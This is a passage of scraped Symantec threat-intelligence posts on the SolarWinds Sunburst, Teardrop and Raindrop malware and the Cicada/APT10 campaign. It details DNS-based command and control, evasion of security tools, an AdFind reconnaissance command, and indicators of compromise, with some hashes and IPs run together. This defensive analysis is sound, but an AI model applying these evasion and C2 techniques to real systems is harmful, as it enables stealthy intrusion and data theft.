pieces of malware act as a loader for Cobalt Strike Beacon. Raindrop uses a custom packer to pack Cobalt Strike. This packer is different to the one used by Teardrop. Raindrop is compiled as a DLL, which is built from a modified version of 7-Zip source code. The 7-Zip code is not utilized and is designed to hide malicious functionality added by the attackers. The DLL is compiled where the Name file of the Export Directory Table is “\"7-zip.dll\" and the Export Names are: And one of the following, selected at random: The Export Names used seem to overlap with names used by Tcl/Tk projects (seehereandhere). Whenever the DLL is loaded, it starts a new thread from the DllMain subroutine that executes the malicious code. This malicious thread performs the following actions: In order to locate the start of the encoded payload, the packer uses steganography by scanning the bytes starting from the beginning of the subroutine and skipping any bytes until the first occurrence of the following bytes that represent operation codes (opcodes) of interest: .data:0000000180053008 opcodes         db 5, 0Dh, 15h, 1Dh, 25h, 2Dh, 35h, 3Dh, 0B8h The malware will then perform the following actions: Although Raindrop is very similar to Teardrop, there are some key differences between the tools. As mentioned previously, Raindrop uses a different packer. The packers differ in the following ways: While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: The discovery of Raindrop is a significant step in our investigation of the SolarWinds attacks as it provides further insights into post-compromise activity at organizations of interest to the attackers. While Teardrop was used on computers that had been infected by the original Sunburst Trojan, Raindrop appeared elsewhere on the network, being used by the attackers to move laterally and deploy payloads on other computers. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Yara rules are alsoavailable for downloadon GitHub. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/solarwinds-raindrop-malware"
  },
  {
    "title": "solarwinds sunburst command control",
    "content": "Inour most recent blog on the SolarWinds attacks, we examined the domain generation algorithm (DGA) used to initiate contact with the attackers’ command and control (C&C) servers. The control flow, what happens after that contact is made, is also noteworthy. The control flow of Sunburst varies depending on commands received from the attacker. However, the general control flow can be reconstructed in order to understand how communications would have progressed on machines that were of interest to the attackers. As described in our previous blog, two types of DNS requests are used for initial communications, and both receive DNS replies. The attackers use two fields in the DNS replies: “A records” for control flow and CNAME to hold data on a secondary C&C server. Normally, when querying DNS, a hostname string is provided to be translated into a numeric IP address, e.g., google.com may translate into 142.250.72.238. The IP address is held in the A record of the response. Sunburst parses the A record for IP addresses, but they are not used as IP addresses at all, but instead are actually triggers for different malware behavior. Instead of the attackers selecting random IP addresses to trigger different behaviors, they have selected IP address ranges belonging to Google, Amazon, and Microsoft. These are possibly chosen in order to reduce the chances of detection. Again, these IPs are not used as IP addresses in any way and the actual computer systems with these IP addresses are not contacted by the malware. The IP address value received in the DNS reply represents one of five behaviors depending on the current state: For a typical infection, Sunburst will first send to the C&C server the first 14 characters of the Windows domain name. This will continue for each 14 character chunk, until the entire Windows Domain name is sent. Next, the attackers will instruct Sunburst tosend the current security product statusesand then send information enabling Sunburst to launch a more robust secondary HTTP-based C&C. Within any DNS reply, the attackers can also instead instruct Sunburst to restore security product service registry keys that were previously disabled back to their believed default settings and quit or reset the internal state as if it is a fresh infection. In addition, to facilitate lab environment and sandbox avoidance, if the DNS requests result in a private range IP address, including 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 224.0.0.0/4, fc00::/7, fec0::/10, ff00::/8, Sunburst will also clean up and exit. Victims that were of interest to the attackers would have reached the secondary C&C stage. In this case, the DNS reply would contain a hostname in the CNAME record to be used as a HTTP C&C channel. The CNAME value is checked to see if it starts with http:// or https:// and is prepended with https:// otherwise. Next, Sunburst will perform repeated HTTP GET requests to receive commands, sleeping a variable amount of time between requests. The path portion of the URL always starts with /swip/upd/ followed by randomly selected URL patterns, in the following order. Optionally, one or more of the following: Optionally, followed by one of the following: If no previous string has been selected, one of the following or optionally, one of the following if a previous string has been selected: Optionally, followed by: Also, if the first character in the path is a dot (.), the dot is removed. For example, the following are example URLs that could be used: The final digit before the .xml extension is not a random character, but represents the return code for previous command requests – typically 0 means success and 1 or other values mean error. For the first 16 requests, a different randomly generated path is used each time, but after that it may repeat random generations that it used previously. If data is being sent to the attacker as a result of a command (e.g. sending system information), the path construction will be different and will be covered in a future blog. Sunburst also adds the custom header “If-None-Match:” set to thepreviously described 8-byte useridXOR’d by a randomly generated 8-byte sequence that is appended and then converted into lowercase ASCII hex. After the HTTP GET request is made, Sunburst checks for a valid response from the attacker. The response uses steganography and is a faux, but convincing XML page of data, where only certain fields are utilized by Sunburst. The faux XML data is searched for a sequence of: These sequences are concatenated together with non-hexadecimal characters removed. The first DWORD (4 bytes) of the sequence represents the size of the remaining data, which is validated and then the next byte is an XOR key. The rest of the data is then XOR decrypted by the key byte and then decompressed. After being decompressed, the first character is a number that specifies the action to perform followed by the number of included arguments in the following data for the command: The command number can instruct Sunburst to perform the following behaviors: If no data needs to be sent to the attacker, the above GET request with the return code encoded in the URL filename is sent. If data needs to be sent to the attacker as a result of these commands (e.g. sending system information), the data will be included in the next regular HTTP(S) communication as a POST request or a HEAD request if some error occurred where the data is missing. Details on each of these behaviors and how data is uploaded to the attacker will be covered in an upcoming blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/solarwinds-sunburst-command-control"
  },
  {
    "title": "solarwinds unique dga",
    "content": "In the weeks sincenews of the SolarWinds attacks broke, we’ve continued our analysis into the tools used by the attackers. One of the most interesting things we’ve seen is the way the attackers configured their malware in order to contact a command and control (C&C) server via DNS communications. It’s a technique that is rarely used, but there have been some reports of other APT groups such as Crambus (aka Oilrig) using it previously. Sunburst (Backdoor.Sunburst), the malware which was used to Trojanize the SolarWinds Orion software, uses a domain generation algorithm (DGA) to generate domain names to contact for C&C purposes. However, unlike most DGAs, this DGA does not just randomly generate characters. Instead, information is encoded into the text that makes up the generated domain names. By doing so, initial C&C actually happens via DNS, which provides a stealthier level of communications. For each infected computer, Sunburst generates a unique ID, referred to as a userid. The userid is made up of the first active MAC address that is not the loopback address, concatenated with the Windows Domain name of the computer, and then concatenated with the Windows installation UUID, a randomly generated value at Windows installation time stored in HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid. These three values are then MD5 hashed and the first 64 bits are XOR’d with the last 64 bits, resulting in a unique 64-bit userid. Because multiple DNS requests will have to be made to transmit all payload information, the attackers require a unique ID to know from which computer the information is coming from. DNS is a distributed protocol, meaning the infected computer does not contact the attacker’s C&C server directly, but instead the DNS request is passed through multiple intermediaries before reaching the attacker DNS server. Only by including the userid within the DNS request will the attackers be able to combine the multiple requests. The DNS lookup will be in one of the following forms: <encoded information>.appsync-api.eu-west-1.avsvmcloud.com <encoded information>.appsync-api.us-west-2.avsvmcloud.com <encoded information>.appsync-api.us-east-1.avsvmcloud.com <encoded information>.appsync-api.us-east-2.avsvmcloud.com The encoded information will be in one of two forms providing the attackers either the Windows domain name of the infected organization or security product statuses and feedback on the infected machine. Initially, after Sunburstchecks for or bypasses security tools and products, the first DNS lookup will occur containing the infected computer’s Windows domain name or a portion thereof, encoded into the C&C domain. The Windows domain is usually a human-readable string representing the name of the organization the machine belongs to, e.g. AcmeA1Corp. The DGA will start by prepending the aforementioned userid with a randomly chosen key byte between 0x81 and 0xFE followed by the userid XOR’d with the key byte. These nine bytes are then encoded in a fashion similar to Base64, resulting in 15 characters. This string of characters is then followed by the Windows domain name, encoded. Because Windows domain names can be up to 253 characters long, Sunburst chooses to segment the Windows domain names into 14 character chunks preceded by the chunk number (where the first chunk number is 0). Windows domain names longer than 14 characters will thus require more than one DNS lookup to provide the entire Windows domain name. Sunburst will also resend previously sent chunks if an error was encountered or, under certain error conditions, set the chunk number to a negative one. The segment chunk number and the Windows domain name are both encoded separately and appended to the encoded userid. These elements form the subdomain of the domain. This domain is queried via DNS, which results in this encoded information reaching the attacker’s DNS server. The attacker can then decode the information and reply with further instructions, which will be covered in a future blog. Sunburst does not automatically generate multiple DNS queries in order to send the entire Windows domain name. Whether Sunburst will send the remaining 14-character segments depends on the response received from the initial DNS query. Because Sunburst was delivered via a supply chain attack, many systems that are not of interest will be infected. By encoding the first 14 characters of the Windows domain name into the first DNS query, the attackers are able to triage infections and only mount second-state attacks on systems of interest - those that have Windows domain names that match organizations they wish to target. Depending on the response to the first DNS lookup, a second DNS lookup may occur that encodes the status of installed security products on the system and information on whether the DNS communication has been successful. First, the userid is XOR’d by the third and second bytes of a timestamp value described below in an alternating fashion before being XOR’d by a randomly chosen key byte between 0x01 and 0x7E that is then prepended to the userid. The first byte thus provides not only the key byte, but informs the attackers if the remaining content will contain the Windows domain name payload (key byte is between 0x81 and 0xFE) or the security product status and feedback payload (key byte is between 0x01 and 0x7E). After the userid, a nibble (half a byte) is used to specify if the security payload information has content (nibble is set to 2) or is blank (nibble is set to 1). This is followed by a timestamp in UTC of when the DNS query was sent, granular to 30-minute increments. The last bit of the timestamp is set to a bit flag representing whether the previous DNS response successfully contained partial or full instructions to start the secondary HTTP communication channel. This may have been designed by the attackers as a feedback mechanism to ensure the DNS communication mechanism is working before sending the full HTTP communication channel details and, in the case of full details, a signal that the HTTP communication should have already started. After the timestamp, the security product status payload is optionally provided if select security product services were found as running. The two bytes contain a bitmask that encodes information on whether any of the following security products were not found, or found running and/or subsequently disabled and stopped: The userid, timestamp, feedback bit, and optional security product data are then encoded into text as the subdomain of a DNS query that is sent to the attackers. The responses to these DNS queries may then contain control information for the threat to terminate or launch a secondary HTTP communication channel, something that we plan to cover in a subsequent blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/solarwinds-unique-dga"
  },
  {
    "title": "solarwinds attacks stealthy attackers attempted evade detection",
    "content": "As we continue our analysis on the tools used inthe SolarWinds attacks, one of the most striking aspects we’ve noticed is how careful the attackers were to avoid drawing attention to themselves. Software supply chain attacks are relatively stealthy to begin with, since signed software from a trusted source is less likely to raise red flags. However, the attackers weren’t content to rely on the cover this provided and also took several other steps to avoid detection. To begin with, the Sunburst backdoor (Backdoor.Sunburst), which was delivered using a Trojanized update to SolarWinds Orion, sets a delay time of up to 14 days before execution. In other words, no malicious activity will begin until this period has elapsed. The length of time selected is most likely to increase the likelihood that the log entries of the initial malicious activity have been deleted before any subsequent post-breach activity is initiated, thereby making it difficult to correlate the two sets of malicious events. Many organizations, including even managed security services providers (MSSPs), will often purge their security logs after seven days to minimize storage costs and make searching them easier. Sunburst will also check the current Windows domain the machine belongs to. If the domain contains the string 'test' or one of 13 additional specific domains that appear related to lab systems such as “swdev.local” and “apac.lab”, the threat will cease to execute.  A full list is in Appendix A. Attacks begin with a Trojanized version of SolarWinds’ Orion software. The attackers modified Orion in order to deliver the Sunburst backdoor to the computer. Sunburst is first stage malware, designed to perform reconnaissance on the infected computer, perform checks for security tools, and deliver a second stage payload, if required. The main Sunburst code is contained in a class named SolarWindows.Orion.Core.BusinessLayer that, when first instantiated, calls a member function called Update. The function name is a ruse, as the code does not perform any update, but instead is designed to disable security software, avoid security researcher systems, and possibly avoid running on systems not of interest to the attackers. The function contains three lists – a list of process names, a list of driver filenames, and a list of processes and service name pairs. These names are all obfuscated in the code by hashing them using the FNV1A algorithm and using variable names that masquerade as timestamps. This process and driver list contains tools that commonly run on security researcher systems and thus, this functionality appears to be designed not to run on such systems in order to avoid discovery. The full list of security tools can be found in Appendix A. Furthermore, the lists also contained names related to a variety of security software programs including: The security vendors on this list have most likely been chosen as the attacker has determined that their products are unlikely be installed at organizations of interest to the attackers. Given the indiscriminate nature of supply chain as a vector, with an estimated 18,000 SolarWinds customers affected, the attackers probably wanted to avoid any risk of detection in organizations that weren’t of interest to them. Interestingly, the process solarwindsdiagnostics is also blacklisted. Presumably this is included to avoid detection during any SolarWinds testing or troubleshooting. Sunburst also attempts to specifically disable some software security services via the registry. This allows Sunburst to perform its malicious actions completely undetected. If the attackers worked quickly and restored the services afterwards, a security administrator would potentially have no record of the activity, nor have even noticed the temporary lack of protection. Figure 1. Example of how Sunburst disables security software. In this case it checks if the CrowdStrike processes csfalconservice or csfalconcontainer are running, and if so, it sets the csagent, csfalconservice, and csdevicecontrol services to be disabled. To disable the security software, Sunburst will simply set the products’ service start setting to Disabled. In Windows, this is done by setting the registry keys: This will cause the security software not to load at the next reboot. It should be noted that the attackers do not attempt to disable any Symantec products. Presumably this is because of an anti-tampering feature in Symantec software, which prevents its own service from being disabled. The process and services pair list include software from the following vendors: Interestingly, the list also included Microsoft Defender, but only the service key permissions are changed.  Currently, this has an unknown effect. In addition, some other unknown products are also included, but were effectively commented out. The attackers may have discovered this technique was ineffective for these products. Finally, Sunburst will check if api.solarwinds.com resolves to a valid address before continuing. The SolarWinds attacks are among the best-planned and adept attacks we have seen in recent years. The attackers have gone to great lengths to both find an effective path into their targeted organizations and, once inside their networks, maintain a low profile. Our analysis of these tools is ongoing and we plan to publish further blogs in the coming weeks. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/solarwinds-attacks-stealthy-attackers-attempted-evade-detection"
  },
  {
    "title": "threat landscape trends q3 2020",
    "content": "We took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from July, August, and September 2020 From significant increases in Emotet and Cobalt Strike activity to a spike in the number of server vulnerability exploit attempts, let’s take a quick look at the trends that shaped the cyber security threat landscape in the third quarter of 2020. Malware attacks have continued to increase quarter over quarter in 2020. In July, August, and September, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked over 78 million malware infection attempts, which represents an almost 30% increase over Q2 and a 127% increase over the number blocked in Q1. The increase in activity may have been spurred by many countries exiting COVID-19 lockdowns, with a resurgence in business activity presenting more opportunities for cyber criminals. Malware that downloads files, which are often malicious, saw an increase in Q3. Symantec blocked 17% more of these threats in Q3 than in Q2. Attacks involving the use of the multipurpose commodity malware Cobalt Strike (Backdoor.Cobalt), have continued to increase. Detections of attacks involving the use of this threat increased 57% from August to September alone. The quarter on quarter trend is even more alarming, with a 163% increase seen when comparing Q1 2019 to Q3 2020. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. The Lokibot information-stealing malware (Infostealer.Lokibot) saw a 237% increase in activity from Q2 to Q3 2020. Lokibot is one of today’s most prevalent information-stealing threats and is often distributed via spam campaigns. Blocked Lokibot attacks in September reached the highest number seen since June 2019. As predicted towards the end of June, after over a year of subdued activity, the Emotet botnet (Trojan.Emotet), a known malware distribution platform, has returned in Q3. Following a dramatic drop in activity in Q2 2019 the malware looks to be steadily ramping up activity, with the number of blocked infection attempts in Q3 up 44% over that of Q1. The vast majority of Emotet infection attempts are blocked by email protection products, meaning antivirus detections are a small, representative sample of blocked Emotet activity. Looking at the numbers by month, there was a significant jump in activity from June to September, equating to a 353% increase. The vast majority of these blocked Emotet attacks occurred in the U.S. Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. This campaign contributed to the surge in activity seen in September. For additional information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor Spam emails using COVID-19 themed lures have increased month-on-month in Q3, with a roughly 27% increase in the number of these emails blocked by Symantec each month. As mentioned, Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. In Q3, the number of phishing attempts blocked by Symantec’s Intrusion Prevention System (IPS) technology increased 25% over the previous quarter, and almost doubled (97%) over numbers from Q1 2020. The number of server vulnerability exploit attempts blocked by Symantec IPS technology in Q3 increased by 77% over the previous quarter. This increase in exploit attempts follows a series of critical server vulnerability disclosures, such as the “Zerologon” flaw in Windows Server (CVE-2020-1472) and a vulnerability in Pulse Secure VPN servers (CVE-2019-11510). These types of vulnerabilities are tempting for hackers as they can offer access to enterprise servers and all the sensitive data stored there. Servers are also an ideal platform for launching further attacks. The average number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 8% in Q3 compared to Q2 2020. *Symantec IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. While the number of attacks decreased, the number of unique IP addresses performing IoT attacks increased in Q3, up 18% over the previous quarter. This suggests that the botnets carrying out the attacks are increasing in size. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest number of attacks originated from IP addresses located in the U.S. with 25% of attacks emanating from here. However, the number of attacks originating in the U.S. decreased in Q3, down from 34% the previous quarter. The second highest number of attacks originated in Vietnam, followed by China, India, and Taiwan. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-trends-q3-2020"
  },
  {
    "title": "sunburst supply chain attack solarwinds",
    "content": "UPDATE December 16 2020:Our blog has been updated with analysis of the Teardrop second-stage malware and an example of the post-compromise attack chain. We have also provided clarification on the use of Symantec’s name in a certificate used to sign the SolarWinds software. Thousands of organizations have been affected by a supply chain attack that compromised the update mechanism for SolarWinds Orion software in order to deliver a backdoor Trojan known as Sunburst (Backdoor.Sunburst) (aka Solorigate). Details on the attacks were disclosed yesterday(December 13) by the security firm FireEye. SolarWinds has alsopublished a security advisory for its customers. The campaign has been underway since at least March 2020. Any Orion user who downloaded an update in this period is likely to have been infected with Sunburst. According to FireEye, the attackers conducted further malicious activity on a subset of victim organizations that were of interest to them. By their nature, supply chain attacks are indiscriminate and will infect any user of the compromised software. They are carried out in order to provide the attacker with access to a large number of organizations, a subset of which will be identified as targets of interest for further compromise. The Trojanized software was signed by a certificate marked as being issued by Symantec. Symantec sold its certificate authority business to Digicert in 2018. The certificate in question was a legacy certificate still using the Symantec brand name. Symantec has contacted Digicert, which has confirmed that it is investigating the issue. Symantec has identified more than 2,000 computers at over 100 customers that received Trojanized software updates. We have found a small number of organizations where a second stage payload (Backdoor.Teardrop) was used. An existing SolarWinds DLL called SolarWinds.Orion.Core.BusinessLayer.dll was modified by the attackers to include an added class. The malware is designed to remain inactive for a period after installation. It will then attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will deliver a CNAME record that directs to a command and control (C&C) domain. In SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInterval() code is added to call OrionImprovementBusinessLayer.Initialize(). OrionImprovementBusinessLayer is a malicious class added by the attacker. It has the following functionality: A second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload – the Cobalt Strike commodity malware. The first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. The second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control. The post-compromise attack chain for one computer investigated saw the initial Sunburst malware, a modified solarwinds.orion.core.businesslayer.dll, installed through the Orion update process on the victim computer on the 7th of the month. On the 28th of the month, 21 days later, the legitimate executable solarwinds.businesslayerhost.exe, which loads the malicious DLL, created a copy of Teardrop in a file called cbsys.dll, in the c:\\windows\\panther folder. This filename and path appear to be unusual since most instances of Teardrop were created in a file called netsetupsvc.dll in the c:\\windows\\syswow64 folder, as documented by FireEye. The Backdoor.Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool. Adfind, a tool that is able to query Active Directory, is then introduced to the system as searchindex.exe and then executed (cmd.exe /c SearchIndex.exe -sc u:<removed> > .\\h.txt). Results are saved in the file h.txt. Using this information, the attackers are attempting to gain elevated privileges (e.g. domain administrator) to access the domain or laterally traverse the environment. Orion users should update to Orion Platform version 2020.2.1 HF 2. Orion users should check their networks for indications of post-compromise activity, including: It should be borne in mind that although there may be some commonalities in post-compromise activity, each victim is likely to see different patterns in activity. That activity is likely to involve heavy use of living-off-the-land techniques to minimize the likelihood of being detected, something the attackers seem to be prioritizing based on how they conducted the first stages of the attack. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/sunburst-supply-chain-attack-solarwinds"
  },
  {
    "title": "cicada apt10 japan espionage",
    "content": "A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it toCicada (aka APT10, Stone Panda, Cloud Hopper).Cicada has been involved in espionage-type operations since 2009, andU.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government. Cicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines. The attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020. This campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer’s networks triggered an alert in ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis. Cloud Analytics leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity. This campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide. The companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together. Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns. As is clear from the map inFigure 1, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China’s borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization. We also saw similar loaders on all the victim networks. These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including: The amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks. In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later. We observed the attackers using a wide variety of living-off-the-land, dual-use, and publicly available tools and techniques in these attacks, including: The threat actors also use a legitimate cloud file-hosting service for exfiltration. The attackers also useDLL side-loadingat multiple stages during the attack, including using it to load Backdoor.Hartip. DLL side-loading occurs when attackers are able to replace a legitimate library with a malicious one, allowing them to load malware into legitimate processes. Attackers use DLL side-loading to try and hide their activity by making it look legitimate, and it also helps them avoid detection by security software. It is a tactic that is commonly used by APT groups and has often been observed being used by nation-state backed actors. Monitoring networks for unusual activity, as Symantec’s Cloud Analytics technology does, is key for detecting this kind of malicious activity. The attackers were also seen deploying a tool capable of exploiting the ZeroLogon vulnerability (CVE-2020-1472). The critical elevation-of-privilege vulnerability was first disclosed and patched on August 11, 2020, and can allow attackers to spoof a domain controller account and then potentially use it to steal domain credentials, take over the domain, and completely compromise all Active Directory identity services. It has been exploited by multiple malicious actors since its disclosure, leading both Microsoft and the Department of Homeland Security’s (DHS) Cybersecurity and Infrastructure Security Agency (CISA) to issue warnings to Windows users to patch the issue as quickly as possible. The scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, such as a nation-state actor, with Symantec discovering enough evidence to attribute it with medium confidence to Cicada. Symantec analysts have linked this activity to Cicada due to the use of previously seen obfuscation techniques and shellcode on loader DLLs. Activity seen in one of the victim organizations has various trait similarities with previously seen Cicada activity that was describedin a blog by Cylance in 2019, including: In another affected organization, the loaders deploying Backdoor.Hartip overlap in the obfuscation and shellcode used, making us confident it is the same actor in both organizations. Similarities between activity in both organizations These similarities leave us confident that this is the same group carrying out this activity in both organizations, and that this group is Cicada. Historically, Cicada has been seen using custom DLL loaders to decrypt and execute its final payload, as is observed in these attacks. We also saw similar loaders as those used in these two organizations used on other victim networks. The scale of the operations also points to a group of Cicada’s size and capabilities. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups. The link all the victims have to Japan also points towards Cicada, which has been known to target Japanese organizations in the past. The targeting of MSPs is also a hallmark of Cicada’s activity. Successfully compromising an MSP can give attackers high-level access to multiple companies without them having to compromise the individual companies’ networks. We have also seen Cicada utilizing some of the same publicly available tools – such as WMIExec – in the past. The attackers also take various steps to reduce the chances of their activity being spotted – including searching for security software on victim machines using WMIC, and using PowerShell to clear event logs to hide their activity once they are finished on victim machines. This kind of activity is the hallmark of sophisticated and experienced threat actors. All of these facts point to Cicada being the perpetrator of these wide-ranging and sophisticated attacks. Intelligence gathering and stealing information has generally been the motivation behind Cicada’s attacks in the past, and that would appear to be the case in this attack campaign too. We observed the attackers archiving some folders of interest in these attacks, including in one organization folders relating to human resources (HR), audit and expense data, and meeting memos. Japan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity. Cicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims. The group’s use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks. This activity was first discovered thanks to an alert triggered by ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). 8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057d5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c18874326460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6acdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086ea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc427873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2edcf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab903ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239 178.73.210.238188.119.112.225213.252.246.24545.14.224.9345.67.230.13481.7.7.15995.179.143.32 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cicada-apt10-japan-espionage"
  },
  {
    "title": "sms phishing presidential election",
